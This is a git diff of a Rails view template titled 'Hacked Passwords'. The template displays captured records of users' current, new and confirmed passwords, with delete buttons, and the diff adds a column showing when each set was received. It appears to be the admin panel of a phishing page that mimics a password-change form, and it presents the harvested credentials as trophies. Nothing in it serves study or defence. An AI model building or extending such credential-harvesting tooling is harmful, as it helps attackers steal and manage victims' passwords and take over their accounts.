@@ -5,13 +5,14 @@
 <table align="center">
   <thead>
   <tr>
-  <td style="border: groove;width: 6cm;background-color: forestgreen;color: black" align="center" colspan="4"><h1 align="center">Hacked Passwords</h1></td>
+  <td style="border: groove;width: 6cm;background-color: forestgreen;color: black" align="center" colspan="5"><h1 align="center">Hacked Passwords</h1></td>
   </tr>
   <tr style="border: groove">
 
       <td style="border: groove;width: 6cm;height: 1cm;background-color: forestgreen;color: white" align="center">Current password</td>
       <td style="border: groove;width: 6cm;height: 1cm;background-color: forestgreen;color: white" align="center">New password</td>
       <td style="border: groove;width: 6cm;height: 1cm;background-color: forestgreen;color: white" align="center">Confirm new password</td>
+      <td style="border: groove;width: 6cm;height: 1cm;background-color: forestgreen;color: white" align="center">Received at</td>
       <td style="border: groove;width: 6cm;height: 1cm;background-color: forestgreen;color: white" align="center">Delete</td>
     </tr>
   </thead>
@@ -22,6 +23,7 @@
         <td style="border: groove;width: 6cm;height: 0.5cm" align="center" ><%= hack.Current_password %></td>
         <td style="border: groove;width: 6cm;height: 0.5cm" align="center"><%= hack.New_password %></td>
         <td style="border: groove;width: 6cm;height: 0.5cm" align="center"><%= hack.Confirm_new_password %></td>
+        <td style="border: groove;width: 6.5cm;height: 0.5cm" align="center">Date: <%=hack.created_at.strftime("%d %b. %Y")%>, Time: <%= hack.created_at.strftime("%I:%M %p")%></td>
         <td style="border: groove;width: 6cm;height: 0.5cm" align="center"><%= link_to 'Delete',hack,method: :delete,class: "btn btn-success btn-block" , data: { confirm: 'Are you sure?' } %></td>
       </tr>
     <% end %>
